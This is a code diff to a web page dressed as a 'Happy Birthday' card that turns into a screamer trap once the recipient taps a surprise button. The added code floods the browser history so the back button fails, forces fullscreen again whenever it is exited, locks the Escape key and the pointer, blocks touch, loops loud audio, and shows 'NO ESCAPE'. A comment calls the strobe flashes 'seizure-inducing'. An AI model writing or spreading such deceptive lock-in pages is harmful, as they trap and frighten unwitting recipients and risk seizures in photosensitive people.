@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#000000">
     <title>Happy Birthday! 🎂</title>
     <style>
         /* --- GLOBAL RESET --- */
@@ -12,17 +13,22 @@
             box-sizing: border-box;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
         }
 
         html, body {
             overflow: hidden;
-            height: 100vh;
-            width: 100vw;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            height: 100%;
+            width: 100%;
             background: #000;
-            /* MOBILE DEFENSE: Kills pull-to-refresh and browser swipe-back */
+            /* DEFENSE: Kills pull-to-refresh and browser swipe-back */
             touch-action: none; 
             overscroll-behavior: none;
+            position: fixed; 
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
         }
 
         /* =========================================
@@ -84,6 +90,7 @@
             margin-bottom: 15px;
             font-weight: 700;
             text-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
 
         .card p {
@@ -92,6 +99,7 @@
             font-size: 1.2rem;
             line-height: 1.6;
             font-weight: 500;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
 
         .btn-surprise {
@@ -109,6 +117,7 @@
             outline: none;
             text-transform: uppercase;
             letter-spacing: 1px;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
 
         .btn-surprise:hover { transform: translateY(-3px); background: rgba(255, 255, 255, 0.5); }
@@ -121,6 +130,7 @@
             color: rgba(255, 255, 255, 0.7);
             opacity: 0;
             transition: opacity 0.3s;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
 
         .confetti {
@@ -142,13 +152,14 @@
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            width: 100vw;
+            height: 100dvh; 
             background: #000;
             z-index: 1;
             display: none;
         }
 
+        /* KEXART STYLE JITTER ANIMATION */
         .loop-img {
             position: absolute;
             top: 0;
@@ -157,8 +168,21 @@
             height: 100%;
             object-fit: cover;
             display: none;
+            will-change: transform; /* Performance Boost */
         }
-        .loop-img.active { display: block; }
+        
+        .loop-img.active { 
+            display: block; 
+            animation: violent-shake 0.2s infinite;
+        }
+
+        @keyframes violent-shake {
+            0% { transform: translate(0, 0) scale(1.02); }
+            25% { transform: translate(-5px, 5px) scale(1.05); }
+            50% { transform: translate(5px, -5px) scale(1.02); }
+            75% { transform: translate(-5px, -5px) scale(1.05); }
+            100% { transform: translate(0, 0) scale(1.02); }
+        }
 
         /* STROBE LAYER */
         #strobe-layer {
@@ -173,10 +197,18 @@
             pointer-events: none;
             display: none;
         }
-        @keyframes strobe-anim {
-            0% { opacity: 0; }
-            50% { opacity: 0.15; }
-            100% { opacity: 0; }
+        
+        #breach-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #8a0303;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            display: none;
         }
 
         /* BLOOD TEXT LAYER */
@@ -239,6 +271,7 @@
     <!-- HORROR UI -->
     <div id="chaos-layer"></div>
     <div id="strobe-layer"></div>
+    <div id="breach-layer"></div>
     <div id="glitch-text"></div>
     <div id="trap-net"></div>
 
@@ -246,7 +279,7 @@
         // CONFIGURATION
         const CONFIG = {
             imageCount: 15,          
-            loopSpeed: 50,           
+            loopSpeed: 60,  // Slightly adjusted for better render sync
             fileExt: '.jpg'
         };
 
@@ -257,6 +290,7 @@
         const innocentLayer = document.getElementById('innocent-layer');
         const chaosLayer = document.getElementById('chaos-layer');
         const strobeLayer = document.getElementById('strobe-layer');
+        const breachLayer = document.getElementById('breach-layer');
         const glitchText = document.getElementById('glitch-text');
         const triggerBtn = document.getElementById('trigger-btn');
         const loadStatus = document.getElementById('load-status');
@@ -275,6 +309,7 @@
                 const img = new Image();
                 img.src = `${i}${CONFIG.fileExt}`;
                 img.className = 'loop-img';
+                img.loading = "eager";
                 img.onload = () => { loaded++; checkLoad(); };
                 img.onerror = () => { loaded++; checkLoad(); };
                 images.push(img);
@@ -297,9 +332,17 @@
             trapNet.style.display = 'block';
             
             strobeLayer.style.display = 'block';
-            strobeLayer.style.animation = 'strobe-anim 0.1s infinite';
             glitchText.style.display = 'block';
             glitchText.classList.add('dripping-blood');
+
+            // --- THE TRAP: HISTORY FLOOD ---
+            // This fills the back button history so they can't swipe back
+            try {
+                history.pushState(null, document.title, location.href);
+                window.addEventListener('popstate', function (event) {
+                    history.pushState(null, document.title, location.href);
+                });
+            } catch(e) {}
 
             forceFullscreen();
             audio.volume = 1.0;
@@ -308,6 +351,7 @@
         });
 
         function startChaosLoop() {
+            let tick = 0;
             setInterval(() => {
                 images[activeIndex].classList.remove('active');
                 activeIndex++;
@@ -315,10 +359,14 @@
                 images[activeIndex].classList.add('active');
 
                 // Vibration (Mobile Only)
-                try { if (navigator.vibrate) navigator.vibrate([50, 50, 50]); } catch(e){}
+                try { if (navigator.vibrate) navigator.vibrate(50); } catch(e){}
+
+                // Strobe Sync (Every 2nd frame for seizure-inducing strobe, careful!)
+                tick++;
+                strobeLayer.style.opacity = (tick % 2 === 0) ? '0.1' : '0';
 
                 // Random Blood Text
-                if (Math.random() > 0.6) {
+                if (Math.random() > 0.65) {
                     glitchText.innerText = CREEPY_WORDS[Math.floor(Math.random() * CREEPY_WORDS.length)];
                     glitchText.style.fontSize = (Math.random() * 5 + 3) + 'rem';
                     glitchText.style.color = BLOOD_COLORS[Math.floor(Math.random() * BLOOD_COLORS.length)];
@@ -334,39 +382,67 @@
 
         async function forceFullscreen() {
             const doc = document.documentElement;
+            // Attempt standard fullscreen
             try {
                 if (doc.requestFullscreen) await doc.requestFullscreen();
                 else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
             } catch(e) {}
             
+            // Attempt Keyboard Lock (Desktop)
             try {
                 if (navigator.keyboard && navigator.keyboard.lock) {
                     await navigator.keyboard.lock(['Escape']);
                 }
             } catch(e) {}
-
+            
+            // Attempt Pointer Lock (Desktop)
             try { document.body.requestPointerLock(); } catch(e) {}
         }
 
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement && isPrankActive) {
-                audio.play();
-                forceFullscreen();
-            }
-        });
+        // --- SELF-HEALING / READJUSTMENT LOGIC ---
+        function handleBreach() {
+            if (!isPrankActive) return;
 
-        // MOBILE DEFENSE: Intercept ALL touch movements so they can't swipe easily inside the window
-        document.addEventListener('touchmove', function(e) {
-            if(isPrankActive) {
-                e.preventDefault();
-            }
+            // Trigger Red Flash
+            breachLayer.style.display = 'block';
+            breachLayer.style.opacity = '0.5';
+            setTimeout(() => { breachLayer.style.opacity = '0'; }, 200);
+
+            // Change text
+            glitchText.innerText = "NO ESCAPE";
+            glitchText.style.color = "#ff0000";
+            glitchText.style.fontSize = "5rem";
+            glitchText.style.left = "50%";
+            glitchText.style.top = "50%";
+
+            window.scrollTo(0, 0);
+            forceFullscreen();
+        }
+
+        window.addEventListener('resize', handleBreach);
+        if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', handleBreach);
+        }
+
+        // Prevent Scroll/Touch Navigation
+        document.body.addEventListener('touchmove', function(e) {
+            if(isPrankActive) e.preventDefault();
         }, { passive: false });
 
-        ['click', 'mousemove', 'mousedown', 'touchstart', 'keydown', 'resize', 'focus'].forEach(evt => {
+        // General Trap Listeners
+        ['click', 'mousemove', 'mousedown', 'touchstart', 'keydown', 'focus'].forEach(evt => {
             window.addEventListener(evt, () => {
-                if(isPrankActive && !document.fullscreenElement) forceFullscreen();
+                if(isPrankActive && !document.fullscreenElement) {
+                    forceFullscreen();
+                }
             });
         });
+
+        // Loop background audio force
+        audio.addEventListener('ended', function() {
+            this.currentTime = 0;
+            this.play();
+        }, false);
 
         window.onbeforeunload = function() {
             if(isPrankActive) return "Are you sure you want to leave?";
